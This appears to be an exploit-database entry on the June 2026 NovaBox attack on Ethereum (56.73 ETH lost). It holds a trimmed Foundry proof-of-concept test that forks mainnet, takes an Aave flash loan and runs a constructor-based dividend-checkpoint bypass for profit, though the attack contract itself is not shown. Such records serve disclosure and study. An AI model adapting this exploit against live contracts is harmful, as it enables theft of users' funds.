# [?] NovaBox - Constructor Dividend Checkpoint Bypass

## Summary
Severity: Unknown
Chain: Ethereum
Component: NovaBox
Published: 2026-06-09
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/NovaBox_exp.sol
Type: defi-exploit-poc

## Details
Lost: 56.73 ETH

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        vm.createSelectFork("mainnet", 25_281_767);
        fundingToken = address(0);

        vm.label(ATTACKER, "Attacker");
        vm.label(ATTACK_CONTRACT, "Trace Attack Contract");
        vm.label(VULNERABLE_CONTRACT, "NovaBox");
        vm.label(NOVA, "NOVA");
        vm.label(WETH, "WETH");
        vm.label(AAVE_V3_POOL, "Aave V3 Pool");
    }

    function testExploit() public balanceLog2(ATTACKER) {
        uint256 profitBefore = ATTACKER.balance;
        uint256 sameBlockNovaSeed = 0.001 ether;
        uint256 flashAmount = 427.5 ether;
        uint256 expectedMinimumProfit = 50 ether;

        NovaBoxRoot root = new NovaBoxRoot(payable(ATTACKER), flashAmount);
        vm.label(address(root), "Local Root Attack");

        // step 1: model same-block tx index 0, which seeded the future root contract with 0.001 NOVA.
        deal(NOVA, address(root), sameBlockNovaSeed);
        assertEq(INovaToken(NOVA).balanceOf(address(root)), sameBlockNovaSeed);

        // step 2: execute the trace order: local receiver, Aave flash loan, constructor helper, then profit forwarding.
        root.run();

        uint256 profit = ATTACKER.balance - profitBefore;
        emit log_named_decimal_uint("ETH profit after Aave repayment", profit, 18);
        assertGt(profit, expectedMinimumProfit);
    }
}

```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2026-06/NovaBox_exp.sol_
